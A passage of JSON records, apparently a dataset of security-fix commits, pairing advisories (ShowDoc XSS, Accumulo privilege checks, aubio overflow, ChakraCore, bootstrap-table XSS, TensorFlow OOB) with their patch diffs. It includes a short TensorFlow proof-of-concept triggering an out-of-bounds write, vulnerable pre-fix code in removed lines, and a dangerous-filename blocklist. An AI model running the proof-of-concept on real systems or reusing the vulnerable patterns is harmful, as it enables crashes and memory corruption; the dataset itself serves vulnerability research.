RANDOM_KEY_IN_CSRF_SESSION_TOKEN_SECURE_RANDOM;\\n     \\n     \/**\\n      * Indicates that the serialized state will be compressed before it is written to the session. By default true.'}}","message_norm":"merge pull request #132 from wtlucy\/securerandom_master\n\nmyfaces-4373: prefer securerandom for token generation","language":"en","entities":"[('#132', 'ISSUE', ''), ('securerandom_master', 'SECWORD', ''), ('securerandom', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['impl\/src\/main\/java\/org\/apache\/myfaces\/config\/MyfacesConfig.java'])","num_files":1.0},{"index":1918,"vuln_id":"GHSA-gq77-3r6x-383w","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/818d7fe731f452acccacf731ce47ec27ad68049c'}","dataset":"osv","summary":"Cross-site Scripting in ShowDoc ShowDoc version 2.10.3 and prior is vulnerable to stored cross-site scripting. A patch is available and anticipated to be part of version 2.10.4.","published_date":"2022-03-13","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/818d7fe731f452acccacf731ce47ec27ad68049c","commit_sha":"818d7fe731f452acccacf731ce47ec27ad68049c","patch":"SINGLE","chain_ord":"['818d7fe731f452acccacf731ce47ec27ad68049c']","before_first_fix_commit":"{'85af5ab5a375ce16f991e2acb15466be4b3ba44b'}","last_fix_commit":"818d7fe731f452acccacf731ce47ec27ad68049c","chain_ord_pos":1.0,"commit_datetime":"03\/08\/2022, 03:48:44","message":"file upload bug","author":"star7th","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/818d7fe731f452acccacf731ce47ec27ad68049c\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': '@@ -301,6 +301,7 @@ public function isDangerFilename($filename){\\n \\t\\t\\t|| $isDangerStr($filename , \".svg\")\\n \\t\\t\\t|| $isDangerStr($filename , \".htm\")\\n \\t\\t\\t|| $isDangerStr($filename , \"%\")\\n+\\t\\t\\t|| $isDangerStr($filename , \".xml\")\\n \\t\\t) {\\n \\t\\t\\treturn true;\\n \\t\\t}'}}","message_norm":"file upload bug","language":"ro","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":1923,"vuln_id":"GHSA-grc3-8q8m-4j7c","cwe_id":"{'CWE-280', 'CWE-732'}","score":8.1,"chain":"{'https:\/\/github.com\/apache\/accumulo\/commit\/877ad502f6857e48342664e4b0ce83db74e4cda4'}","dataset":"osv","summary":"Improper privilege handling in Apache Accumulo Apache Accumulo versions 1.5.0 through 1.10.0 and version 2.0.0 do not properly check the return value of some policy enforcement functions before permitting an authenticated user to perform certain administrative operations. Specifically, the return values of the 'canFlush' and 'canPerformSystemActions' security functions are not checked in some instances, therefore allowing an authenticated user with insufficient permissions to perform the following actions: flushing a table, shutting down Accumulo or an individual tablet server, and setting or removing system-wide Accumulo configuration properties.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/apache\/accumulo","commit_href":"https:\/\/github.com\/apache\/accumulo\/commit\/877ad502f6857e48342664e4b0ce83db74e4cda4","commit_sha":"877ad502f6857e48342664e4b0ce83db74e4cda4","patch":"SINGLE","chain_ord":"['877ad502f6857e48342664e4b0ce83db74e4cda4']","before_first_fix_commit":"{'024a72ed8b80c21470ab2eed04787e3216b7b606'}","last_fix_commit":"877ad502f6857e48342664e4b0ce83db74e4cda4","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2020, 19:08:36","message":"Throw exceptions when permissions checks fail (#1828)\n\n(cherry-picked for 2.0.1)\n\nAdd and throw missing exceptions when permissions checks fail. This\nprevents certain operations that the user does not have privileges to\nperform from succeeding anyway.","author":"Christopher Tubbs","comments":null,"stats":"{'additions': 14, 'deletions': 7, 'total': 21}","files":"{'server\/master\/src\/main\/java\/org\/apache\/accumulo\/master\/MasterClientServiceHandler.java': {'additions': 14, 'deletions': 7, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/accumulo\/raw\/877ad502f6857e48342664e4b0ce83db74e4cda4\/server%2Fmaster%2Fsrc%2Fmain%2Fjava%2Forg%2Fapache%2Faccumulo%2Fmaster%2FMasterClientServiceHandler.java', 'patch': '@@ -112,7 +112,8 @@ public long initiateFlush(TInfo tinfo, TCredentials c, String tableIdStr)\\n       throws ThriftSecurityException, ThriftTableOperationException {\\n     TableId tableId = TableId.of(tableIdStr);\\n     NamespaceId namespaceId = getNamespaceIdFromTableId(TableOperation.FLUSH, tableId);\\n-    master.security.canFlush(c, tableId, namespaceId);\\n+    if (!master.security.canFlush(c, tableId, namespaceId))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     String zTablePath = Constants.ZROOT + \"\/\" + master.getInstanceID() + Constants.ZTABLES + \"\/\"\\n         + tableId + Constants.ZTABLE_FLUSH_ID;\\n@@ -145,7 +146,8 @@ public void waitForFlush(TInfo tinfo, TCredentials c, String tableIdStr, ByteBuf\\n       throws ThriftSecurityException, ThriftTableOperationException {\\n     TableId tableId = TableId.of(tableIdStr);\\n     NamespaceId namespaceId = getNamespaceIdFromTableId(TableOperation.FLUSH, tableId);\\n-    master.security.canFlush(c, tableId, namespaceId);\\n+    if (!master.security.canFlush(c, tableId, namespaceId))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     Text startRow = ByteBufferUtil.toText(startRowBB);\\n     Text endRow = ByteBufferUtil.toText(endRowBB);\\n@@ -247,7 +249,8 @@ public void setTableProperty(TInfo info, TCredentials credentials, String tableN\\n   @Override\\n   public void shutdown(TInfo info, TCredentials c, boolean stopTabletServers)\\n       throws ThriftSecurityException {\\n-    master.security.canPerformSystemActions(c);\\n+    if (!master.security.canPerformSystemActions(c))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n     if (stopTabletServers) {\\n       master.setMasterGoalState(MasterGoalState.CLEAN_STOP);\\n       EventCoordinator.Listener eventListener = master.nextEvent.getListener();\\n@@ -261,7 +264,8 @@ public void shutdown(TInfo info, TCredentials c, boolean stopTabletServers)\\n   @Override\\n   public void shutdownTabletServer(TInfo info, TCredentials c, String tabletServer, boolean force)\\n       throws ThriftSecurityException {\\n-    master.security.canPerformSystemActions(c);\\n+    if (!master.security.canPerformSystemActions(c))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     final TServerInstance doomed = master.tserverSet.find(tabletServer);\\n     if (!force) {\\n@@ -333,15 +337,17 @@ public void reportTabletStatus(TInfo info, TCredentials credentials, String serv\\n   @Override\\n   public void setMasterGoalState(TInfo info, TCredentials c, MasterGoalState state)\\n       throws ThriftSecurityException {\\n-    master.security.canPerformSystemActions(c);\\n+    if (!master.security.canPerformSystemActions(c))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     master.setMasterGoalState(state);\\n   }\\n \\n   @Override\\n   public void removeSystemProperty(TInfo info, TCredentials c, String property)\\n       throws ThriftSecurityException {\\n-    master.security.canPerformSystemActions(c);\\n+    if (!master.security.canPerformSystemActions(c))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     try {\\n       SystemPropUtil.removeSystemProperty(master.getContext(), property);\\n@@ -355,7 +361,8 @@ public void removeSystemProperty(TInfo info, TCredentials c, String property)\\n   @Override\\n   public void setSystemProperty(TInfo info, TCredentials c, String property, String value)\\n       throws ThriftSecurityException, TException {\\n-    master.security.canPerformSystemActions(c);\\n+    if (!master.security.canPerformSystemActions(c))\\n+      throw new ThriftSecurityException(c.getPrincipal(), SecurityErrorCode.PERMISSION_DENIED);\\n \\n     try {\\n       SystemPropUtil.setSystemProperty(master.getContext(), property, value);'}}","message_norm":"throw exceptions when permissions checks fail (#1828)\n\n(cherry-picked for 2.0.1)\n\nadd and throw missing exceptions when permissions checks fail. this\nprevents certain operations that the user does not have privileges to\nperform from succeeding anyway.","language":"en","entities":"[('permissions', 'SECWORD', ''), ('#1828', 'ISSUE', ''), ('2.0.1', 'VERSION', ''), ('add', 'ACTION', ''), ('permissions', 'SECWORD', ''), ('prevents', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/master\/src\/main\/java\/org\/apache\/accumulo\/master\/MasterClientServiceHandler.java'])","num_files":1.0},{"index":1928,"vuln_id":"GHSA-grmf-4fq6-2r79","cwe_id":"{'CWE-119'}","score":9.8,"chain":"{'https:\/\/github.com\/aubio\/aubio\/commit\/b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5'}","dataset":"osv","summary":"Improper Restriction of Operations within the Bounds of a Memory Buffer in aubio aubio v0.4.0 to v0.4.8 has a Buffer Overflow in new_aubio_tempo.","published_date":"2019-07-26","chain_len":1,"project":"https:\/\/github.com\/aubio\/aubio","commit_href":"https:\/\/github.com\/aubio\/aubio\/commit\/b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5","commit_sha":"b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5","patch":"SINGLE","chain_ord":"['b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5']","before_first_fix_commit":"{'c4a8bc138e49de8b43fcd2221ef84dfa5073208f'}","last_fix_commit":"b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2018, 16:17:29","message":"[tempo] fix buffer overflow in method parser","author":"Paul Brossier","comments":null,"stats":"{'additions': 4, 'deletions': 3, 'total': 7}","files":"{'src\/tempo\/tempo.c': {'additions': 4, 'deletions': 3, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/aubio\/aubio\/raw\/b1559f4c9ce2b304d8d27ffdc7128b6795ca82e5\/src%2Ftempo%2Ftempo.c', 'patch': '@@ -168,7 +168,7 @@ aubio_tempo_t * new_aubio_tempo (const char_t * tempo_mode,\\n     uint_t buf_size, uint_t hop_size, uint_t samplerate)\\n {\\n   aubio_tempo_t * o = AUBIO_NEW(aubio_tempo_t);\\n-  char_t specdesc_func[20];\\n+  char_t specdesc_func[PATH_MAX];\\n   o->samplerate = samplerate;\\n   \/\/ check parameters are valid\\n   if ((sint_t)hop_size < 1) {\\n@@ -203,9 +203,10 @@ aubio_tempo_t * new_aubio_tempo (const char_t * tempo_mode,\\n   o->pp       = new_aubio_peakpicker();\\n   aubio_peakpicker_set_threshold (o->pp, o->threshold);\\n   if ( strcmp(tempo_mode, \"default\") == 0 ) {\\n-    strcpy(specdesc_func, \"specflux\");\\n+    strncpy(specdesc_func, \"specflux\", PATH_MAX - 1);\\n   } else {\\n-    strcpy(specdesc_func, tempo_mode);\\n+    strncpy(specdesc_func, tempo_mode, PATH_MAX - 1);\\n+    specdesc_func[PATH_MAX - 1] = \\'\\\\0\\';\\n   }\\n   o->od       = new_aubio_specdesc(specdesc_func,buf_size);\\n   o->of       = new_fvec(1);'}}","message_norm":"[tempo] fix buffer overflow in method parser","language":"en","entities":"[('buffer overflow', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/tempo\/tempo.c'])","num_files":1.0},{"index":1931,"vuln_id":"GHSA-grvw-q343-58wh","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/7e9a2ee60baa95ceb4f48f522f823c812ca90c80', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/95b3e3400afb8fa20743657f3a8057fb451e6f69'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1138, CVE-2019-1217, CVE-2019-1237, CVE-2019-1298.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/95b3e3400afb8fa20743657f3a8057fb451e6f69","commit_sha":"95b3e3400afb8fa20743657f3a8057fb451e6f69","patch":"MULTI","chain_ord":"['95b3e3400afb8fa20743657f3a8057fb451e6f69', '7e9a2ee60baa95ceb4f48f522f823c812ca90c80']","before_first_fix_commit":"{'edf5eeef49168bbcc30dac82f57048ad46988295', 'c5297b86536fbf1a02d27cec28fea3c516e6ab84'}","last_fix_commit":"7e9a2ee60baa95ceb4f48f522f823c812ca90c80","chain_ord_pos":1.0,"commit_datetime":"07\/08\/2019, 15:54:11","message":"[CVE-2019-1300]","author":"Paul Leathers","comments":null,"stats":"{'additions': 43, 'deletions': 31, 'total': 74}","files":"{'lib\/Backend\/GlobOpt.cpp': {'additions': 43, 'deletions': 31, 'changes': 74, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/95b3e3400afb8fa20743657f3a8057fb451e6f69\/lib%2FBackend%2FGlobOpt.cpp', 'patch': \"@@ -1167,6 +1167,10 @@ void GlobOpt::InsertValueCompensation(\\n     IR::Instr *insertBeforeInstr = predecessor->GetLastInstr();\\n     Func *const func = insertBeforeInstr->m_func;\\n     bool setLastInstrInPredecessor;\\n+    \/\/ If this is a loop back edge, and the successor has been completed, don't attempt to update its block data.\\n+    \/\/ The update is unnecessary, and the data has likely been freed.\\n+    bool updateSuccessorBlockData = !this->isPerformingLoopBackEdgeCompensation || successor->GetDataUseCount() > 0;\\n+\\n     if(insertBeforeInstr->IsBranchInstr() || insertBeforeInstr->m_opcode == Js::OpCode::BailTarget)\\n     {\\n         \/\/ Don't insert code between the branch and the corresponding ByteCodeUses instructions\\n@@ -1257,29 +1261,33 @@ void GlobOpt::InsertValueCompensation(\\n             \/\/ Merge the head segment length value\\n             Assert(predecessorBlockData.liveVarSyms->Test(predecessorHeadSegmentLengthSym->m_id));\\n             predecessorBlockData.liveVarSyms->Set(mergedHeadSegmentLengthSym->m_id);\\n-            successorBlockData.liveVarSyms->Set(mergedHeadSegmentLengthSym->m_id);\\n             Value *const predecessorHeadSegmentLengthValue =\\n                 predecessorBlockData.FindValue(predecessorHeadSegmentLengthSym);\\n             Assert(predecessorHeadSegmentLengthValue);\\n             predecessorBlockData.SetValue(predecessorHeadSegmentLengthValue, mergedHeadSegmentLengthSym);\\n-            Value *const mergedHeadSegmentLengthValue = successorBlockData.FindValue(mergedHeadSegmentLengthSym);\\n-            if(mergedHeadSegmentLengthValue)\\n+\\n+            if (updateSuccessorBlockData)\\n             {\\n-                Assert(mergedHeadSegmentLengthValue->GetValueNumber() != predecessorHeadSegmentLengthValue->GetValueNumber());\\n-                if(predecessorHeadSegmentLengthValue->GetValueInfo() != mergedHeadSegmentLengthValue->GetValueInfo())\\n+                successorBlockData.liveVarSyms->Set(mergedHeadSegmentLengthSym->m_id);\\n+                Value *const mergedHeadSegmentLengthValue = successorBlockData.FindValue(mergedHeadSegmentLengthSym);\\n+                if(mergedHeadSegmentLengthValue)\\n                 {\\n-                    mergedHeadSegmentLengthValue->SetValueInfo(\\n-                        ValueInfo::MergeLikelyIntValueInfo(\\n-                            this->alloc,\\n-                            mergedHeadSegmentLengthValue,\\n-                            predecessorHeadSegmentLengthValue,\\n-                            mergedHeadSegmentLengthValue->GetValueInfo()->Type()\\n-                                .Merge(predecessorHeadSegmentLengthValue->GetValueInfo()->Type())));\\n+                    Assert(mergedHeadSegmentLengthValue->GetValueNumber() != predecessorHeadSegmentLengthValue->GetValueNumber());\\n+                    if(predecessorHeadSegmentLengthValue->GetValueInfo() != mergedHeadSegmentLengthValue->GetValueInfo())\\n+                    {\\n+                        mergedHeadSegmentLengthValue->SetValueInfo(\\n+                            ValueInfo::MergeLikelyIntValueInfo(\\n+                                this->alloc,\\n+                                mergedHeadSegmentLengthValue,\\n+                                predecessorHeadSegmentLengthValue,\\n+                                mergedHeadSegmentLengthValue->GetValueInfo()->Type()\\n+                                    .Merge(predecessorHeadSegmentLengthValue->GetValueInfo()->Type())));\\n+                    }\\n+                }\\n+                else\\n+                {\\n+                    successorBlockData.SetValue(CopyValue(predecessorHeadSegmentLengthValue), mergedHeadSegmentLengthSym);\\n                 }\\n-            }\\n-            else\\n-            {\\n-                successorBlockData.SetValue(CopyValue(predecessorHeadSegmentLengthValue), mergedHeadSegmentLengthSym);\\n             }\\n         }\\n \\n@@ -1300,27 +1308,31 @@ void GlobOpt::InsertValueCompensation(\\n             \/\/ Merge the length value\\n             Assert(predecessorBlockData.liveVarSyms->Test(predecessorLengthSym->m_id));\\n             predecessorBlockData.liveVarSyms->Set(mergedLengthSym->m_id);\\n-            successorBlockData.liveVarSyms->Set(mergedLengthSym->m_id);\\n             Value *const predecessorLengthValue = predecessorBlockData.FindValue(predecessorLengthSym);\\n             Assert(predecessorLengthValue);\\n             predecessorBlockData.SetValue(predecessorLengthValue, mergedLengthSym);\\n-            Value *const mergedLengthValue = successorBlockData.FindValue(mergedLengthSym);\\n-            if(mergedLengthValue)\\n+\\n+            if (updateSuccessorBlockData)\\n             {\\n-                Assert(mergedLengthValue->GetValueNumber() != predecessorLengthValue->GetValueNumber());\\n-                if(predecessorLengthValue->GetValueInfo() != mergedLengthValue->GetValueInfo())\\n+                successorBlockData.liveVarSyms->Set(mergedLengthSym->m_id);\\n+                Value *const mergedLengthValue = successorBlockData.FindValue(mergedLengthSym);\\n+                if(mergedLengthValue)\\n                 {\\n-                    mergedLengthValue->SetValueInfo(\\n-                        ValueInfo::MergeLikelyIntValueInfo(\\n-                            this->alloc,\\n-                            mergedLengthValue,\\n-                            predecessorLengthValue,\\n-                            mergedLengthValue->GetValueInfo()->Type().Merge(predecessorLengthValue->GetValueInfo()->Type())));\\n+                    Assert(mergedLengthValue->GetValueNumber() != predecessorLengthValue->GetValueNumber());\\n+                    if(predecessorLengthValue->GetValueInfo() != mergedLengthValue->GetValueInfo())\\n+                    {\\n+                        mergedLengthValue->SetValueInfo(\\n+                            ValueInfo::MergeLikelyIntValueInfo(\\n+                                this->alloc,\\n+                                mergedLengthValue,\\n+                                predecessorLengthValue,\\n+                                mergedLengthValue->GetValueInfo()->Type().Merge(predecessorLengthValue->GetValueInfo()->Type())));\\n+                    }\\n+                }\\n+                else\\n+                {\\n+                    successorBlockData.SetValue(CopyValue(predecessorLengthValue), mergedLengthSym);\\n                 }\\n-            }\\n-            else\\n-            {\\n-                successorBlockData.SetValue(CopyValue(predecessorLengthValue), mergedLengthSym);\\n             }\\n         }\"}}","message_norm":"[cve-2019-1300]","language":"ro","entities":"[('cve-2019-1300', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOpt.cpp'])","num_files":1.0},{"index":1932,"vuln_id":"GHSA-grw5-g9h2-wpg8","cwe_id":"{'CWE-79'}","score":6.8,"chain":"{'https:\/\/github.com\/wenzhixin\/bootstrap-table\/commit\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9'}","dataset":"osv","summary":"Cross-site Scripting in bootstrap-table Bootstrap Tables XSS vulnerability with Table Export plug-in when exportOptions: htmlContent is true in GitHub repository wenzhixin\/bootstrap-table prior to 1.20.2. Disclosing session cookies, disclosing secure session data, exfiltrating data to third-parties.","published_date":"2022-05-17","chain_len":1,"project":"https:\/\/github.com\/wenzhixin\/bootstrap-table","commit_href":"https:\/\/github.com\/wenzhixin\/bootstrap-table\/commit\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9","commit_sha":"b4a1e5dd332be652e0bc376fd9256886cf4bbde9","patch":"SINGLE","chain_ord":"['b4a1e5dd332be652e0bc376fd9256886cf4bbde9']","before_first_fix_commit":"{'55d3760df3d226ac1150d7ddcbfd0ff6bd1c53c2'}","last_fix_commit":"b4a1e5dd332be652e0bc376fd9256886cf4bbde9","chain_ord_pos":1.0,"commit_datetime":"05\/10\/2022, 02:59:07","message":"Fixed XSS vulnerability bug by onCellHtmlData","author":"zhixin","comments":null,"stats":"{'additions': 4, 'deletions': 16, 'total': 20}","files":"{'src\/extensions\/export\/bootstrap-table-export.js': {'additions': 4, 'deletions': 16, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/wenzhixin\/bootstrap-table\/raw\/b4a1e5dd332be652e0bc376fd9256886cf4bbde9\/src%2Fextensions%2Fexport%2Fbootstrap-table-export.js', 'patch': \"@@ -23,15 +23,7 @@ $.extend($.fn.bootstrapTable.defaults, {\\n   showExport: false,\\n   exportDataType: 'basic', \/\/ basic, all, selected\\n   exportTypes: ['json', 'xml', 'csv', 'txt', 'sql', 'excel'],\\n-  exportOptions: {\\n-    onCellHtmlData (cell, rowIndex, colIndex, htmlData) {\\n-      if (cell.is('th')) {\\n-        return cell.find('.th-inner').text()\\n-      }\\n-\\n-      return htmlData\\n-    }\\n-  },\\n+  exportOptions: {},\\n   exportFooter: false\\n })\\n \\n@@ -162,13 +154,9 @@ $.BootstrapTable = class extends $.BootstrapTable {\\n     $exportButtons.click(e => {\\n       e.preventDefault()\\n \\n-      const type = $(e.currentTarget).data('type')\\n-      const exportOptions = {\\n-        type,\\n-        escape: false\\n-      }\\n-\\n-      this.exportTable(exportOptions)\\n+      this.exportTable({\\n+        type: $(e.currentTarget).data('type')\\n+      })\\n     })\\n     this.handleToolbar()\\n   }\"}}","message_norm":"fixed xss vulnerability bug by oncellhtmldata","language":"en","entities":"[('fixed', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/extensions\/export\/bootstrap-table-export.js'])","num_files":1.0},{"index":1933,"vuln_id":"GHSA-gv26-jpj9-c8gq","cwe_id":"{'CWE-754'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6fde895ef9c77d848061c0517f19d0ec2682f3a'}","dataset":"osv","summary":"Incomplete validation in `SparseSparseMinimum` ### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python \nimport tensorflow as tf\n\na_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    b_shape=b_shape)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches \nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [f6fde895ef9c77d848061c0517f19d0ec2682f3a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6fde895ef9c77d848061c0517f19d0ec2682f3a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2022-03-18","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2","commit_sha":"ba6822bd7b7324ba201a28b2f278c29a98edbef2","patch":"MULTI","chain_ord":"['ba6822bd7b7324ba201a28b2f278c29a98edbef2', 'f6fde895ef9c77d848061c0517f19d0ec2682f3a']","before_first_fix_commit":"{'cae81a7ae3ca6207396d5c893e8163f4acb34037'}","last_fix_commit":"f6fde895ef9c77d848061c0517f19d0ec2682f3a","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 23:06:54","message":"Fix OOB issue with `tf.raw_ops.SparseSparseMinimum`.\n\nPiperOrigin-RevId: 371005787\nChange-Id: Ib686ccc077836e8b980b8b5a03936d36a8ecaf71","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/ba6822bd7b7324ba201a28b2f278c29a98edbef2\/tensorflow%2Fcore%2Fkernels%2Fsparse_sparse_binary_op_shared.cc', 'patch': '@@ -180,6 +180,11 @@ class SparseSparseBinaryOpShared : public OpKernel {\\n                                           \" for dimension \", i));\\n     }\\n \\n+    OP_REQUIRES(\\n+        ctx, a_indices_t->dim_size(1) == b_indices_t->dim_size(1),\\n+        errors::InvalidArgument(\\n+            \"Indices\\' dimensions do not match: got \", a_indices_t->dim_size(1),\\n+            \" and \", b_indices_t->dim_size(1), \" for the second dimension.\"));\\n     const int num_dims = a_indices_t->dim_size(1);\\n     const auto a_indices_mat = a_indices_t->matrix<int64>();\\n     const auto b_indices_mat = b_indices_t->matrix<int64>();'}}","message_norm":"fix oob issue with `tf.raw_ops.sparsesparseminimum`.\n\npiperorigin-revid: 371005787\nchange-id: ib686ccc077836e8b980b8b5a03936d36a8ecaf71","language":"en","entities":"[('fix', 'ACTION', ''), ('oob', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371005787', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc'])","num_files":1.0},{"index":1934,"vuln_id":"GHSA-gv26-jpj9-c8gq","cwe_id":"{'CWE-754'}","score":5.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6fde895ef9c77d848061c0517f19d0ec2682f3a'}","dataset":"osv","summary":"Incomplete validation in `SparseSparseMinimum` ### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python \nimport tensorflow as tf\n\na_indices = tf.ones([45, 92], dtype=tf.int64)\na_values = tf.ones([45], dtype=tf.int64)\na_shape = tf.ones([1], dtype=tf.int64)\nb_indices = tf.ones([1, 1], dtype=tf.int64)\nb_values = tf.ones([1], dtype=tf.int64)\nb_shape = tf.ones([1], dtype=tf.int64)\n                    \ntf.raw_ops.SparseSparseMinimum(a_indices=a_indices,\n    a_values=a_values,\n    a_shape=a_shape,\n    b_indices=b_indices,\n    b_values=b_values,\n    b_shape=b_shape)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/656e7673b14acd7835dc778867f84916c6d1cac2\/tensorflow\/core\/kernels\/sparse_sparse_binary_op_shared.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches \nWe have patched the issue in GitHub commit [ba6822bd7b7324ba201a28b2f278c29a98edbef2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/ba6822bd7b7324ba201a28b2f278c29a98edbef2) followed by GitHub commit [f6fde895ef9c77d848061c0517f19d0ec2682f3a](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6fde895ef9c77d848061c0517f19d0ec2682f3a).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2022-03-18","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f6fde895ef9c77d848061c0517f19d0ec2682f3a","commit_sha":"f6fde895ef9c77d848061c0517f19d0ec2682f3a","patch":"MULTI","chain_ord":"['ba6822bd7b7324ba201a28b2f278c29a98edbef2', 